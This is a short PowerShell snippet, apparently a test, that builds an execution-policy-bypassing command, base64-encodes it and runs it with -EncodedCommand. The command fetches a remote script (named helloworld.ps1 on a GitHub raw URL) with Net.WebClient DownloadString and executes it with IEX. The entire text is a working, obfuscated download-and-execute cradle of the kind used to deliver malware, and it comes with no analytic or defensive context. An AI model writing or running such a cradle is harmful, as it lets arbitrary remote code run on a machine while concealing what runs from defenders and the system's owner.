$cmd = "powershell -nop -exec bypass -c `"IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/imjustgunnamakethisthing/test/master/helloworld.ps1’);`""
$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand  $encodedCmd
